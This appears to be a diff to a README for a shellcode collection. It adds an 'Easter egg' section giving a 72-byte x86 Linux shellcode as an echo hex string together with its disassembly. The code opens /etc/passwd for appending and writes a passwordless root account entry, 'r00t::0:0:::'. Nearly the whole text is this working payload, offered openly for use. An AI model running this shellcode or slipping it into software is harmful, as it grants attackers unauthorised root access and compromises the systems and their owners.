@@ -72,3 +72,39 @@ Obtain from running:
     0000003F  6A01              push byte +0x1
     00000041  58                pop eax
     00000042  CD80              int 0x80
+
+## Easter egg 
+
+ Due to changes made in the code are pretty insignificant to reduce the length in bytes, there is another file named root_user_bigger_length which is 72 bytes length with more modifications. 
+ 
+Length: 72 bytes
+
+Obtain from running: 
+
+    echo -ne "\x6a\x05\x58\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x8d\x5d\xd4\x66\xb9\x01\x04\xcd\x80\x6a\x03\x5b\x83\xc0\x01\x50\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x8d\x4d\xc4\x6a\x0c\x5a\xcd\x80\x83\xc3\x03\x89\xd8\xcd\x80\x89\xd8\x83\xe8\x05\xcd\x80" | ndisasm -u -
+    00000000  6A05              push byte +0x5
+    00000002  58                pop eax
+    00000003  51                push ecx
+    00000004  6873737764        push dword 0x64777373
+    00000009  682F2F7061        push dword 0x61702f2f
+    0000000E  682F657463        push dword 0x6374652f
+    00000013  8D5DD4            lea ebx,[ebp-0x2c]
+    00000016  66B90104          mov cx,0x401
+    0000001A  CD80              int 0x80
+    0000001C  6A03              push byte +0x3
+    0000001E  5B                pop ebx
+    0000001F  83C001            add eax,byte +0x1
+    00000022  50                push eax
+    00000023  68303A3A3A        push dword 0x3a3a3a30
+    00000028  683A3A303A        push dword 0x3a303a3a
+    0000002D  6872303074        push dword 0x74303072
+    00000032  8D4DC4            lea ecx,[ebp-0x3c]
+    00000035  6A0C              push byte +0xc
+    00000037  5A                pop edx
+    00000038  CD80              int 0x80
+    0000003A  83C303            add ebx,byte +0x3
+    0000003D  89D8              mov eax,ebx
+    0000003F  CD80              int 0x80
+    00000041  89D8              mov eax,ebx
+    00000043  83E805            sub eax,byte +0x5
+    00000046  CD80              int 0x80
